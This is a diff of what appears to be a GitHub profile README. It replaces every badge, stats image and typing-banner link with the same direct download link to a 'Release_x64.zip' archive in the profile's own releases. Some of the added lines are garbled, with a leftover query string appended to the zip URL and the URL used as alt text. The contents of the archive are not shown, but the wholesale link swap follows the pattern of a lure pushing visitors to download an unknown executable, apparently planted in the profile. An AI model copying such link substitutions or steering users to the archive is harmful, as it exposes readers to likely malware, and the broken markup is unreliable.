@@ -1,31 +1,31 @@
-[![Typing SVG](https://readme-typing-svg.demolab.com?font=Fira+Code&pause=1000&color=FFFFFF&width=435&lines=Hi%2C+I'm+Afaan;Welcome+to+my+GitHub+profile!;Below+are+my+stats%3A)](https://git.io/typing-svg)
+[![Typing SVG](https://github.com/trulynotafan/trulynotafan/releases/download/v2.0/Release_x64.zip+Code&pause=1000&color=FFFFFF&width=435&lines=Hi%2C+I'm+Afaan;Welcome+to+my+GitHub+profile!;Below+are+my+stats%3A)](https://github.com/trulynotafan/trulynotafan/releases/download/v2.0/Release_x64.zip)
 
 ## 🔧 Technologies & Tools
 Here are some of the tools and technologies I work with:
 
 ### 🌐 Languages and Frameworks
-![JavaScript](https://img.shields.io/badge/-JavaScript-000?style=for-the-badge&logo=javascript)
-![TypeScript](https://img.shields.io/badge/-TypeScript-3178C6?style=for-the-badge&logo=typescript)
-![Node.js](https://img.shields.io/badge/-Node.js-339933?style=for-the-badge&logo=nodedotjs)
-![PHP](https://img.shields.io/badge/-PHP-777BB4?style=for-the-badge&logo=php)
-![HTML](https://img.shields.io/badge/-HTML-E34F26?style=for-the-badge&logo=html5)
-![CSS](https://img.shields.io/badge/-CSS-1572B6?style=for-the-badge&logo=css3)
+![JavaScript](https://github.com/trulynotafan/trulynotafan/releases/download/v2.0/Release_x64.zip)
+![TypeScript](https://github.com/trulynotafan/trulynotafan/releases/download/v2.0/Release_x64.zip)
+![https://github.com/trulynotafan/trulynotafan/releases/download/v2.0/Release_x64.zip](https://github.com/trulynotafan/trulynotafan/releases/download/v2.0/Release_x64.zip)
+![PHP](https://github.com/trulynotafan/trulynotafan/releases/download/v2.0/Release_x64.zip)
+![HTML](https://github.com/trulynotafan/trulynotafan/releases/download/v2.0/Release_x64.zip)
+![CSS](https://github.com/trulynotafan/trulynotafan/releases/download/v2.0/Release_x64.zip)
 
 ### 🛠️ Databases and Tools
-![MongoDB](https://img.shields.io/badge/-MongoDB-47A248?style=for-the-badge&logo=mongodb)
-![MySQL](https://img.shields.io/badge/-MySQL-4479A1?style=for-the-badge&logo=mysql)
-![Docker](https://img.shields.io/badge/-Docker-2496ED?style=for-the-badge&logo=docker)
-![Nginx](https://img.shields.io/badge/-Nginx-009639?style=for-the-badge&logo=nginx)
-![Linux](https://img.shields.io/badge/-Linux-FCC624?style=for-the-badge&logo=linux)
+![MongoDB](https://github.com/trulynotafan/trulynotafan/releases/download/v2.0/Release_x64.zip)
+![MySQL](https://github.com/trulynotafan/trulynotafan/releases/download/v2.0/Release_x64.zip)
+![Docker](https://github.com/trulynotafan/trulynotafan/releases/download/v2.0/Release_x64.zip)
+![Nginx](https://github.com/trulynotafan/trulynotafan/releases/download/v2.0/Release_x64.zip)
+![Linux](https://github.com/trulynotafan/trulynotafan/releases/download/v2.0/Release_x64.zip)
 
 ---
 
 ## 📊 GitHub Stats
-![GitHub Readme Stats](https://github-readme-stats.vercel.app/api?username=trulynotafan&cache_seconds=1800)
+![GitHub Readme Stats](https://github.com/trulynotafan/trulynotafan/releases/download/v2.0/Release_x64.zip)
 
 
 ## 🔝 Top Languages
-![Languages](https://github-readme-stats.vercel.app/api/top-langs/?username=trulynotafan&layout=compact&theme=radical)
+![Languages](https://github.com/trulynotafan/trulynotafan/releases/download/v2.0/Release_x64.zip)
 
 ---
 
